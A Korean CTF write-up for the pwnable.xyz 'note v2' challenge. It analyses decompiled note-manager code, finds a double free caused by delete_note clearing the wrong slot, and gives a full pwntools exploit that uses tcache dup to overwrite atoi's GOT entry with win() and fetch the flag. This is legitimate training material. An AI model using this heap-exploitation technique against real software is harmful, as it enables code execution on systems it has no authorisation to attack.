# [pwnable.xyz] note v2

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> Note taking 102
>
> Release: [note v2.zip](https://github.com/h0meb0dy/pwnable.xyz/files/9009494/note.v2.zip)

## Mitigation

![image](https://user-images.githubusercontent.com/104156058/176410814-deea1b3c-e96e-4d10-b50c-85991982da57.png)

## Analysis

### `win()`

```c
int win()
{
  return system("cat flag");
}
```

`win()`이 실행되도록 하면 플래그를 획득할 수 있다.

### `struct note`

![image](https://user-images.githubusercontent.com/104156058/176411815-2a8da3b2-5a55-437e-9a3d-a48344aa93af.png)

노트의 정보를 담는 구조체이다. 최대 `0x20`바이트의 `title`과 노트의 내용이 저장된 메모리의 주소 `content`로 구성된다.

### `main()`

#### 1. Make note

```c
      case 1u:
        make_note();
        break;
```

#### `make_note()`

```c
int make_note()
{
  note **v0; // rax
  int v1; // eax
  __int64 idx; // rcx
  int size; // [rsp+4h] [rbp-Ch]
  note *note; // [rsp+8h] [rbp-8h]

  if ( count <= 32 )
  {
    printf("size of note: ");
    size = read_int32();
    note = (note *)malloc(0x28uLL);
    if ( !note->content )
      note->content = (char *)malloc(size);
    printf("title: ");
    read(0, note, 0x20uLL);
    printf("note: ");
    read(0, note->content, size - 1);
    v1 = count++;
    idx = v1;
    v0 = book;
    book[idx] = note;
  }
  else
  {
    LODWORD(v0) = puts("Limit reached.");
  }
  return (int)v0;
}
```

저장된 노트의 수(`count`)가 `0x20`보다 크면 더 이상 노트를 만들 수 없다.

노트의 `content`의 길이를 입력받고, 그 길이만큼 청크를 할당한다. `title`을 최대 `0x20`바이트만큼 입력받고, `content`를 최대 `size - 1`만큼 입력받는다. 만들어진 노트는 전역 변수 `book`에 저장된다.

#### 2. Edit note

```c
      case 2:
        edit_note(v3, argv);
        break;
```

#### `edit_note()`

```c
note *edit_note()
{
  note *note; // rax
  size_t size; // rax
  note *_note; // [rsp+8h] [rbp-8h]

  note = get_note();
  _note = note;
  if ( note )
  {
    printf("Title %s: ", note->title);
    size = strlen(_note->content);
    return (note *)read(0, _note->content, size);
  }
  return note;
}
```

`get_note()`로 `book`에 저장된 노트를 하나 가져온다. `note->title`을 `"%s"`로 출력하고, `note->content`를 `strlen(note->content)`만큼 다시 입력받는다.

#### 3. Delete note

```c
      case 3:
        delete_note(v3, argv);
        break;
```

#### `delete_note()`

```c
note *delete_note()
{
  note *note; // rax
  int v1; // eax
  __int64 idx; // rdx

  note = get_note();
  if ( note )
  {
    free(note->content);
    v1 = count--;
    idx = v1;
    note = (note *)book;
    book[idx] = 0LL;
  }
  return note;
}
```

`get_note()`로 `book`에 저장된 노트를 하나 가져와서 `note->content`가 저장된 청크를 할당 해제한다. 그리고 나서 `get_note()`로 가져온 노트가 아니라 `book[count]`에 저장된 노트를 0으로 초기화하여 삭제한다.

#### 4. Print note

```c
      case 4:
        print_note(v3, argv);
        break;
```

#### `print_note()`

```c
int print_note()
{
  note *note; // rax

  note = get_note();
  if ( note )
    LODWORD(note) = printf("%s : %s\n", note->title, note->content);
  return (int)note;
}
```

`get_note()`로 `book`에 저장된 노트를 하나 가져와서 `note->title`과 `note->content`의 내용을 `"%s"`로 출력한다.

## Exploit

서버에 연결해서 노트 두 개를 만들고 같은 노트 두 개를 연속으로 삭제해도 오류가 발생하지 않는다. 즉, 서버는 double free bug를 이용할 수 있는 환경임을 알 수 있다. Tcache dup 기법으로 함수의 GOT를 `win()`의 주소로 덮어쓰면 플래그를 획득할 수 있다.

### Full exploit

```python
from pwn import *

LOCAL = False

if LOCAL:
    r = process('./release/challenge')
else:
    r = remote('svc.pwnable.xyz', 30030)

sla = r.sendlineafter
sa = r.sendafter

def make_note(size, title, content):
    sa('> ', '1')
    sa('size of note: ', str(size))
    sa('title: ', title)
    sa('note: ', content)

def edit_note(idx, content):
    sa('> ', '2')
    sa('Note#: ', str(idx))
    sa(': ', content)

def delete_note(idx):
    sa('> ', '3')
    sa('Note#: ', str(idx))

def print_note(idx):
    sa('> ', '4')
    sa('Note#: ', str(idx))

win = 0x40096c
atoi_got = 0x602070

make_note(0x28, 'A', 'A')
make_note(0x28, 'A', 'A')

delete_note(0)
delete_note(0) # double free

make_note(0x18, p64(atoi_got), 'A')
make_note(0x18, 'A', 'A')
make_note(0x18, p64(win), 'A') # atoi@GOT -> win()

sa('> ', '0') # call atoi()

r.interactive()
```

```
$ python3 ex.py
[+] Opening connection to svc.pwnable.xyz on port 30030: Done
[*] Switching to interactive mode
FLAG{finally_U4F_is_ch3ck3d}
```